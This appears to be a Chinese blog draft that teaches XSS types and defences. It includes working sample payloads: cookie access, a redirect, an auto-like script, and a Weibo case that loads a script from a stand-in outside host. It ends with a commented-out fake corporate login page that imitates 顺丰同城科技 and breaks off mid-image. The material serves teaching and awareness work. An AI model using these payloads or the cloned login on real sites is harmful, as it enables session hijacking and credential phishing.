<!--
 * @Author: your name
 * @Date: 2021-07-23 17:52:05
 * @LastEditTime: 2021-07-23 17:52:59
 * @LastEditors: Please set LastEditors
 * @Description: In User Settings Edit
 * @FilePath: /droplets/source/_drafts/xss.md
-->

# web 安全之 XSS

#### 前言：大家刚刚已经经历了一次 xss 攻击，刚刚登陆页面其实是一个假的登陆页面，不信你就刷新下页面啥也不用输入直接点登录试试。。。（山上的笋已经被夺完了）。这是利用了 xss 的存储型攻击，如果真的是被攻击者恶意攻击的话，大家的账号和密码早已经被拿到，但是放心，我们可不能这么做。

# XSS 漏洞

## 一、什么是 XSS

XSS 是跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为 XSS。恶意攻击者往 Web 页面里插入恶意 Script 代码，当用户浏览该页之时，嵌入其中 Web 里面的 Script 代码会被执行，从而达到恶意攻击用户的目的。

## 二、XSS 攻击的危害

1.窃取用户 Cookie，获取用户隐私，盗取用户账号。

```
document.cookie
```

2.劫持流量实现恶意跳转。

```
<script>window.location.href="http://xxx";</script>
```

3.发送广告或者垃圾信息。

4.网站挂马。先将恶意攻击代码嵌入到 Web 应用程序之中。当用户浏览该挂马页面时，用户的计算机会被植入木马。

5.未授权操作。例如代替用户发送请求，进行评论，点赞等行为。

## 三、XSS 常见的注入方法

- 在 HTML 中内嵌的文本中，恶意内容以 script 标签形成注入。
- 在内联的 JavaScript 中，拼接的数据突破了原本的限制（字符串，变量，方法名等）。
- 在标签属性中，恶意内容包含引号，从而突破属性值的限制，注入其他属性或者标签。
- 在标签的 href、src 等属性中，包含 `javascript:` (伪协议)等可执行代码。
- 在 onload、onerror、onclick 等事件中，注入不受控制代码。
- 在 style 属性和标签中，包含类似 `background-image:url("javascript:...");` 的代码（新版本浏览器已经可以防范）。
- 在 style 属性和标签中，包含类似 `expression(...)` 的 CSS 表达式代码（新版本浏览器已经可以防范）。

## 四、XSS 分类

#### 存储型 XSS（持久型）

##### 攻击代码存储区：后端数据库

##### 特点：隐蔽性高，危害大

##### 常见于带有用户保存数据的网站功能，如论坛发帖、商品评论、用户私信等

**攻击步骤:**

1、攻击者把恶意代码提交到目标网站的服务器中。

2、用户打开目标网站，网站服务器端把带有恶意代码的数据取出，当做正常数据返回给用户。

3、用户浏览器接收到响应解析执行，混在其中的恶意代码也被执行。

4、恶意代码窃取用户敏感数据发送给攻击者，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。

<img src="https://festatic-1254389369.cos.ap-guangzhou.myqcloud.com/localservice/sffood/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_4efafd6a-0849-4a35-beee-90caa484af56.png" alt="存储型XSS" style="zoom:50%;" />

我们在发表的文章中插入了点赞脚本，当用户访问时会自动执行脚本，从而形成存储型攻击。

代码 DEMO：

```js
setTimeout(function () {
  var btn = document.querySelector('.like-button-text');
  btn.addEventListener(
    'click',
    function () {
      if (btn.innerText === '踩') {
        btn.click();
      }
    },
    false,
  );
  if (btn.innerText === '赞') {
    btn.click();
  }
}, 1000);
```

#### 反射型 XSS（非持久型）

##### 攻击代码存储区：URL

**常见于通过 URL 传递参数的功能，如网站搜索、跳转等**

##### 攻击步骤：

1、攻击构造出特殊的 URL ，其中包含恶意代码。

2、用户被诱导打开带有恶意代码的 URL，服务器端将恶意代码从 URL 中取出当做参数处理，然后返回给用户带有恶意代码的数据。

3、用户浏览器接收到响应解析执行，混在其中的恶意代码也被执行。

4、恶意代码窃取用户敏感数据发送给攻击者，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。

**注意：** 想要触发漏洞，需要访问特定的链接才能够实现

<img src="https://festatic-1254389369.cos.ap-guangzhou.myqcloud.com/localservice/sffood/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_45e59d86-d04f-4a09-8a24-a7f8cd1097a0.png" alt="反射型XSS" style="zoom:50%;" />

#### 示例

下面的搜索页面，即使没有搜索到结果，后端也会返回用户输入的内容，然后显示在页面上。如果搜索内容为一段攻击脚本，会发现脚本被执行。如下图所示：

页面链接： [https://www.kkkk1000.com/xss/Reflected/index.html](https://www.kkkk1000.com/xss/Reflected/index.html)

![搜索页面](https://festatic-1254389369.cos.ap-guangzhou.myqcloud.com/localservice/sffood/image-20210424190816287.png)

![image-20210424191759400](https://festatic-1254389369.cos.ap-guangzhou.myqcloud.com/localservice/sffood/image-20210424191759400.png)

所以我们构造这样一个链接：

```
https://www.kkkk1000.com/xss/Reflected/searchResult.html?kw=<script>alert("XSS反射型攻击")</script>
```

然后诱导他人点击这个链接，就可以完成一次反射型 XSS 攻击。

#### DOM 型 XSS（非持久）

##### 攻击代码存储区：URL

其实 DOM 型 XSS 是一种特殊的反射型 XSS，它和反射型 XSS 的区别在于取出和执行恶意代码由浏览器端完成，属于前端自身的安全漏洞，因此在使用 `.innerHTML`、`.outerHTML`、`document.write()` 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 `.textContent`、`.setAttribute()` 等。

如果用 Vue/React 技术栈，并且不使用 `v-html`/`dangerouslySetInnerHTML` 功能，就在前端 render 阶段避免 `innerHTML`、`outerHTML` 的 XSS 隐患。

DOM 中的内联事件监听器，如 `location`、`onclick`、`onerror`、`onload`、`onmouseover` 等，`<a>` 标签的 `href` 属性，JavaScript 的 `eval()`、`setTimeout()`、`setInterval()` 等，都能把字符串作为代码运行。如果不可信的数据拼接到字符串中传递给这些 API，很容易产生安全隐患，请务必避免。

##### 攻击步骤

1、攻击者构造出特殊的 URL，其中包含恶意代码。

2、用户被诱导打开带有恶意代码的 URL。

3、用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行。

4、恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。

<img src="https://festatic-1254389369.cos.ap-guangzhou.myqcloud.com/localservice/sffood/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_79d715e3-5576-41dd-8335-27de73b816d8.png" alt="DOM型XSS" style="zoom:50%;" />

## 五、防范手段

1.**httpOnly:** 在 cookie 中设置 HttpOnly 属性后，js 脚本将无法读取到 cookie 信息。

2.**输入过滤:** 一般是用于对于输入格式的检查，例如：邮箱，电话号码，用户名，密码……等，按照规定的格式输入。不仅仅是前端负责，后端也要做相同的过滤检查。因为攻击者完全可以绕过正常的输入流程，直接利用相关接口向服务器发送设置。

3.**转义 HTML:** 对于引号，尖括号，斜杠进行转义。

4.**浏览器自带防御:** 设置 [X-XSS-Protection](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/X-XSS-Protection) http 响应头，当检测到跨站脚本攻击(XSS)时，浏览器将停止加载页面。（Internet Explorer，Chrome 和 Safari 浏览器支持）

5.**定义资源白名单:** 即内容安全策略（CSP），开发者明确告诉客户端，哪些外部资源可以加载和执行，大大增强了网页的安全性。

启用方法：

（1）一种是通过 HTTP 头信息的 Content-Security-Policy 的字段。

```
Content-Security-Policy: script-src 'self';
                         object-src 'none';
                         style-src cdn.example.org third-party.org;
                         child-src https:
```

（2）通过设置网页的 `<meta>` 标签。

```
<meta http-equiv="Content-Security-Policy" content="script-src 'self'; object-src 'none'; style-src cdn.example.org third-party.org; child-src https:">
```

**脚本：** 只信任当前域名

**`<object>`标签：** 不信任任何 URL，即不加载任何资源

**样式表：** 只信任 cdn.example.org 和 third-party.org

**页面子内容，如 `<frame>`、`<iframe>`：** 必须使用 HTTPS 协议加载

**其他资源：** 没有限制

6.**输入内容长度控制:** 对于不受信任的输入，都应该限定一个合理的长度。虽然无法完全防止 XSS 发生，但可以增加 XSS 攻击的难度。

7.**验证码:** 防止脚本冒充用户提交危险操作。

## 六、XSS 攻击案例

#### QQ 邮箱 [m.exmail.qq.com](http://m.exmail.qq.com) 域名反射型 XSS 漏洞

攻击者发现 `http://m.exmail.qq.com/cgi-bin/login?uin=aaaa&domain=bbbb` 这个 URL 的参数 `uin`、`domain` 未经转义直接输出到 HTML 中。

于是攻击者构建出一个 URL，并引导用户去点击： `http://m.exmail.qq.com/cgi-bin/login?uin=aaaa&domain=bbbb%26quot%3B%3Breturn+false%3B%26quot%3B%26lt%3B%2Fscript%26gt%3B%26lt%3Bscript%26gt%3Balert(document.cookie)%26lt%3B%2Fscript%26gt%3B`

用户点击这个 URL 时，服务端取出 URL 参数，拼接到 HTML 响应中：

```
<script>
getTop().location.href="/cgi-bin/loginpage?autologin=n&errtype=1&verify=&clientuin=aaa"+"&t="+"&d=bbbb";return false;</script><script>alert(document.cookie)</script>"+"...
复制代码
```

浏览器接收到响应后就会执行 `alert(document.cookie)`，攻击者通过 JavaScript 即可窃取当前用户在 QQ 邮箱域名下的 Cookie ，进而危害数据安全。

#### 新浪微博名人堂反射型 XSS 漏洞

攻击者发现 `http://weibo.com/pub/star/g/xyyyd` 这个 URL 的内容未经过滤直接输出到 HTML 中。

于是攻击者构建出一个 URL，然后诱导用户去点击：

```
http://weibo.com/pub/star/g/xyyyd"><script src=//xxxx.cn/image/t.js></script>
```

用户点击这个 URL 时，服务端取出请求 URL，拼接到 HTML 响应中：

```
<li><a href="http://weibo.com/pub/star/g/xyyyd"><script src=//xxxx.cn/image/t.js></script>">按分类检索</a></li>
复制代码
```

浏览器接收到响应后就会加载执行恶意脚本 `//xxxx.cn/image/t.js`，在恶意脚本中利用用户的登录状态进行关注、发微博、发私信等操作，发出的微博和私信可再带上攻击 URL，诱导更多人点击，不断放大攻击范围。这种窃用受害者身份发布恶意内容，层层放大攻击范围的方式，被称为“XSS 蠕虫”。

#### 参考：

[跨站脚本攻击—XSS](https://juejin.cn/post/6844903943143718925)

[浅谈 XSS 的那些事](https://zhuanlan.zhihu.com/p/26177815)

[如何防止 XSS 攻击](https://juejin.cn/post/6844903685122703367#heading-15)

 <!-- <div class="body">
      <style>
        * {
          margin: 0;
          padding: 0;
        }
        body,
        html {
          background: #f5f5f5;
        }
        .xsslogin {
          width: 100vw;
          height: 100vh;
          font-size: 50px;
          text-align: center;
          position: fixed;
          top: 0;
          left: 0;
          background: #f5f5f5;
          z-index: 999;
        }
        .xssheader {
          height: 60px;
          line-height: 60px;
          background-color: #000;
          display: flex !important;
          align-items: center;
          color: #fff;
          font-size: 16px;
          font-weight: 700;
          font-family: PingFangSC-Regular;
        }
        .xssheader .logo {
          height: 30px;
          margin: 0 10px 0 40px;
        }
        main {
          display: block;
          margin: 160px auto;
          width: 610px;
          height: 430px;
        }
        .uuap-login {
          display: flex;
          align-items: center;
          font-size: 32px;
          color: #333;
          font-family: PingFangSC-Medium;
          margin-bottom: 20px;
        }
        .uuap-login .logo {
          height: 48px;
          margin-right: 16px;
        }
        .login-container {
          display: flex;
        }
        .login-box {
          width: 410px;
          height: 350px;
          background: #fff;
        }
        .login-container aside {
          width: 200px;
        }
        .login-box h2 {
          color: #666;
          font-size: 20px;
          font-family: PingFangSC-Medium;
          padding: 28px 40px;
          margin-bottom: 18px;
          text-align: left;
        }
        .login-box input {
          width: 326px;
          height: 44px;
          line-height: 44px;
          margin: 0px 40px 20px;
          box-sizing: border-box;
          padding-left: 16px;
          display: block;
        }
        .login-box p {
          text-align: right;
          line-height: 14px;
        }
        .login-box a {
          color: #000;
          text-decoration: none;
          padding-right: 40px;
          font-size: 14px;
        }
        .login-box button {
          margin-top: 20px;
          color: #fff;
          background-color: #e02131;
          border: 0 none;
          border-color: #e02131;
          outline: none;
          width: 326px;
          height: 44px;
          line-height: 44px;
          text-align: center;
          font-size: 18px;
          border-radius: 4px;
        }
        .welcome {
          width: 100vw;
          height: 100vh;
          font-size: 50px;
          text-align: center;
          position: fixed;
          top: 0;
          left: 0;
		  padding-top:200px;
          background: #000;
          z-index: 998;
		  color:#fff;
        }
		.xssexplain{
		  font-size: 30px;
		  margin-top:30px;
		}
		#gogogo{
		  font-size: 20px;
		  cursor: pointer;
		  margin-top: 50px;
		}
      </style>
      <div id="xsslogin" class="xsslogin">
        <header class="xssheader">
          <img
            class="logo"
            src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAADPUlEQVR4AbTXA4wsWRSA4fts2xjbZrC2grVt27Zt2/aGa9s7rpn1WF3vT3JPclKpaveffA9Tt6tO+46JJtd1p6AaJ+JpfI5WDKIff+BTPIajUYaJJtE4SQYug4NYa8E5WBPPhVfhQYSQaGO4GYuivXgeehFUB17EHbgcV+IuvIoeBOVgdcSL27+3wT+QPsHxWBvl03YGvvUMXa+uEfiw92Ib+/+NeBhbxPn6mYBd8ACW25/tDwdz/W7wIFz6BxtNkuOcpRiES1f4PWwhSA+nYIB3IA1hkT54GXSb+5xgMqZEcaGJmI+Jnp/vA91x+kPGgfSJ53ncBx9iCCF04X5k2TXzcCieRgvG1dvvR1yFlZiEFkjfyEVqoDteDXArgrrHrtkWkTrZrr0cuvXGfrzq1trFtZB+xTk4FNehPWCAX3AzzsLleBEDaoAq6PYw/PEMpA5170+F1OB5Pmei2WeAI31eE4tQZv89FUOQbjb2i0V6Ud3wCEhnGv+CBwhe/zGkV4z9VpPu0G9Nz7TvoCSaAXoWl61wFhXt+deqwtU+61+A9JGRDwfb5Z7Fe2MYUgh3YXbQAG76VtOcRYVtXYsK3K7FhY67rHCW55z3Q/rV2O9z6UqfiQvwEnRfY67fAN1LKpZzcVf8s7x4vc8nrvSzsZsJ6a4wz10TvoB0X9BT0L2o8EIehVZnceHlxpPnznxg7E5GejXCC2i6GqIXk+J4EX4O6SVjt1FSj1q4G+b5nOB6SOtiGEDuwCik64zdw+ky7OKr8Cv2wEz7s7X4HS71YWKMAzRCt5uxG0jd6WoAKYRuhCDdYijGAW6AbqV8e7VA+hYTUIb34NdbmB3LABybBgfSx/rgOdDtoo7V4HBcjbOwuefE5XjO2ibMAEdAd4g+uAZjkB5IwYbkTUi9mONdcLPaQC5PwQAZ+A/knuW3YBEc1Ks93NvYB5PiuOA0HIE31DtrR/yGGUE3Wq12r4OQWnA5qjA1wvu8ETfAgfQfdjQU1e8GcBDUMD7GC7gfD+IlfI5RBPUbVkf78M3FFRhCovXiLMyI54WzCMfhG8TaxzgEc5L1Kl6PPXAzXsFH+BU/4wO8hOuwaWHgEo5IAACoNpM5DfZr/QAAAABJRU5ErkJggg=="
          />
          顺丰同城科技
        </header>
        <main>
          <div class="uuap-login">
            <img
              class="logo"
              src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAEnElEQVR4AcXZA3Rj+RfA8VeNnfZvc1WtbY9t27anGNu2bdu2bdvK3e/67T2/qE2b7zmfg+G7TXLzYPmhdPgAzTAJy7ELZ/EQ93Aa27EEY1EXryMUAekvaIMNeAxJovtYgXpwIEULRV7Mw3OInz3CBHyCIPi1/DgOSSXb8QGSXSSWQwJkEv6GJJUB2yBeuoi5iENtlEJO5EZZ1EMnLMF1iJdmIcj3gydKj9EQAyfWoDr+Al/7L5pgh5t/Px7B6pg8FoltSI+fq47HENxDF/wF/uoFDMNTCG4hN37uDziACHhsOQSjYe8tJCICKdU/0R3/UdtvNQSDvdk2YlMdga475CfPEQ1joYZV+RhvIVAVgSjLYSwvxCABgWoKxOBly9A8iHIPEQhUMXBClF6W6q8uTg+6wFRGvI+66I32qI4YuCsEUSiHVuiFwYhHLbyFYNibAVGuI61lq41pDxtWZTCqefgiOobisFcas3AP4sFVxNnW+EcQTf8fGyDKatgLwhyIF27C3m2Ij2Jt/+85iDLGfj7/GOJhhTaGBGAAvUp/wsb8qQ8gBn9Wpxb31e/Px1vIhgi8iw64aBjgDsRmDqojJ97C16iMkbhiGOBjiMEfYDWDKBdg70P1+5cQAlMZ0MnDAP+Gq9KiLl7Ez2V2sWQKwpoEUebAXk7D+bov3TYM4GsHIUocrOUufsNelGFD1UjlASZClEGwdkGU2tAdhiiLEJ3cAa6Gv5dZChcOsdzXG6JMhXFFlYLuDTyBKE6Mw999GuCnA78cHrXwkiNSLodH3rkSEVnOcl07iLIS1kOIkhOmCuIWxOAhqvgywBVHVAIHLz+77Ih6cjX8tT9a5upClD0wfjvmhqv+jplwQgyGezsAP/WZ9gEgVyKi37fMNYAoO2Gdhihl4KlYzIYY1PFmAA621m8GCI+68v3byjIXB1GWwdoOUerB294zfMAf43+eBhA+uLwK7fkcHLoUHrnqmiPmDct1/SDKJFhLIEon+FIOwxBxfl6j0yFKf1jjIMoS2MsCT9WE2Mzy8wAnIEobWPVM59uG7dMW7ioJsVnsxwEcEFfb8nWIwX/UAIK5+D90wVgMsRnsxwG+gShOZIcVivsQpbEe4CdOLEIcyqAeVkGUvH4cYAhE2WfZWgFRdugBfLAHwX4aIAzXIS5fYaoHMXgBFv0bu324R/qCH0/mckM8nS048AiiDFP3jSpgK8TgCXogq5/PRldDlLOm65EJEOUp/gmdA1+iFEriVaSHqzqgs00OeNMnEIP20Lm8bOuOQGU6VXmOv1mGggynFTfxbwSqD/AUYjMZLntfrcvcCHT11Cn7P+C2SRDEw15hTEE0UqqPMRsfeHdM5v6GWQi2bZ/u6pWZgY8QhOQWhlzqy/CpOiPOhCXICM/ZDuwPao1p59AdHyOzj+c232CIh9uUk5EJlLTnZAcgXnLiICaiD9qjHhogDv0wHScgPliSnFc6AoPxHJLKHiIOGZHsolPxefFzTMY/4PdeRi9ch/jZWbTH35DipUVxjMFxSBI4sQ+DkRMhCFh/QEHEYRCmYiX2YCeWYTL6oy1yIjuS3XcfuuAChW27mwAAAABJRU5ErkJggg=="
              class="icon-style"
            />
            顺丰同城科技
          </div>
          <div class="login-container">
            <div class="login-box">
              <h2>欢迎登录</h2>
              <input type="text" placeholder="请输入工号" id="username" />
              <input type="password" placeholder="请输入密码" id="password" />
              <p>
                <a href="https://uuap2.sftcwl.com/pages/passwordreset">忘记密码</a>
              </p>
              <button id="xssloginbtn">登录</button>
            </div>
            <aside>
              <img
                data-v-e4ae30d6=""
                src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMkAAAFeCAMAAAAYDMt4AAABQVBMVEVycnJ4eHh3d3d5eXl8fHx+fn5/f399fX2Hh4eoqKjX19fs7OxHcEwjIyMuLi4vLy8sLCwwMDA7Ozs9PT0+Pj4/Pz88PDw2NjY0NDRVVVW3t7dHR0dJSUlKSkpISEhFRUU6Ojo1NTU3NzdCQkK+vr45OTlERERNTU1PT09QUFBOTk5MTExqampRUVEzMzM4ODhLS0tSUlJBQUFGRkYtLS1AQEAxMTEqKiorKysyMjJDQ0MpKSkoKCgnJycmJiYlJSUkJCQiIiIhISEgICAfHx8dHR0cHBwbGxsaGhoZGRkeHh4YGBgXFxcWFhYVFRUTExMSEhIQEBAUFBQPDw8ODg4NDQ0REREMDAwLCwsKCgoJCQkICAgGBgYEBAQDAwMBAQEHBwcAAAAFBQUCAgIsLCyBgYFtbW3R0dFgYGCenp7a2tq8KhPvAAAAa3RSTlP////////////mphwA/////////////////+3///////////+m/////////+b/////////////////////////////////////////////////////////////////////////5qbtHOamHI3WIAYAABp9SURBVHgBzNFFdgMxDIBhhxkGpTZDmpDlNEz3v1lnF9Re3/PO+D8bU/tQbzRb7Zag3epUo1GtqmlR7/b6g6EZjd9Npp4fhKIgiGLwxpOxHh7+/A7MFD5FsyRJJUmW5gVBCZp488W3kuUqXVuWWLeJgEAZ7+9bSZBsmLcSttmSAJTF7GbvJQSwnx8sHyXbrT0BAZCuEsLPEorPa94eJWyTJYI+nrmUz6ByTez2KNq6K2Kpz+3tT4hgnx/4uBVxUiCBPhNzx1cQZ46PLLDsIiRCff6JNQ9lR3ElgO4XrFdEVSmQCvCgeoIHhd6IDf//Wa+FPXN9UcuDvencRFKrj7p1888/fa0OzMFPXLsKz2lehaAOS70TeuN2dD+vTkKB+4HW1HGYbz+oPBM6Fj2YBACTWVdhPjLOd92xLXfaEdgvae3Ga6tfMtklKhhSj22UxQ9kWdSONdy5eDVJeNDkv/+5fhGjrfyieIBDliTpPDfNBjTzPK9pEkclCO2rW+WnPSpHDosCDuvcdN3m6Bz7MYRO4oweTGjdTEO4Jtfr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